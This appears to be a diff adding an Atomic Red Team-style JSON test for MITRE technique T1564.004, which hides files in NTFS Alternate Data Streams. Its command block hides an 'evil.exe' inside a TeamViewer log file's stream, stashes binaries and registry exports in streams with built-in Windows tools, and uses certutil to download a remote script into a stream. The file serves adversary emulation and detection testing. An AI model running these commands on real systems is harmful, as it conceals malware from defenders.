@@ -1,0 +1,30 @@
+{
+    "name": "Alternate Data Streams (ADS)",
+    "description": "Execute from Alternate Streams  [Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)  [Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1564.004",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "NTFS File Attributes",
+    "source": "ART",
+    "uuid": "8822c3b0-d9f9-4daf-a043-49f4602364f4",
+    "arguments": {
+        "path": {
+            "description": "Path of ADS file",
+            "type": "path",
+            "default": "c:\\ADS\\"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
